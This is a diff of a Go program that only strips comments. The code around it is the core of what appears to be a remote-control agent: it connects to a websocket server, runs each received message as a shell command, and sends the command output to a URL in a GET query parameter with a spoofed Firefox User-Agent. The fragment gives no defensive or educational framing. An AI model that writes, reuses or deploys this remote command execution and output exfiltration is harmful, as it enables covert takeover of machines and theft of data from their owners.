@@ -31,7 +31,6 @@ func main() {
 	//signal.Notify(interrupt, os.Interrupt)
 
 	time.Sleep(1 * time.Second)
-	// connect to server
 	conn, _, err := websocket.DefaultDialer.Dial(socketUrl, nil)
 	if err != nil {
 		red(bold("Error: " + err.Error()))
@@ -60,7 +59,6 @@ func main() {
 
 // function to sendMessage to server
 func sendMessage(conn *websocket.Conn, message string) {
-	// send message to server
 	err := conn.WriteMessage(websocket.TextMessage, []byte(message))
 	if err != nil {
 		red(bold("Error: " + err.Error()))
@@ -82,7 +80,6 @@ func receiveMessage(conn *websocket.Conn) {
 
 // function to execute command
 func execute(command string) string {
-	// split command into args by space exclude first arg
 	args := strings.Split(command, " ")[1:]
 
 	out, err := exec.Command(strings.Split(command, " ")[0], args...).Output()
@@ -94,32 +91,25 @@ func execute(command string) string {
 	return string(out[:])
 }
 
-// function send get request with string data
 func get(url string, data string) {
-	// create client
 	client := &http.Client{}
 
-	// create request
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
 		red(bold("Error: " + err.Error()))
 	}
 
-	// add data to query
 	q := req.URL.Query()
 	q.Add("out", data)
 	req.URL.RawQuery = q.Encode()
 
-	// set header
 	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0")
 
-	// send request
 	resp, err := client.Do(req)
 	if err != nil {
 		red(bold("Error: " + err.Error()))
 	}
 
-	// check if response is 200 OK
 	if resp.StatusCode == http.StatusOK {
 		green(bold("Success: " + resp.Status))
 	}
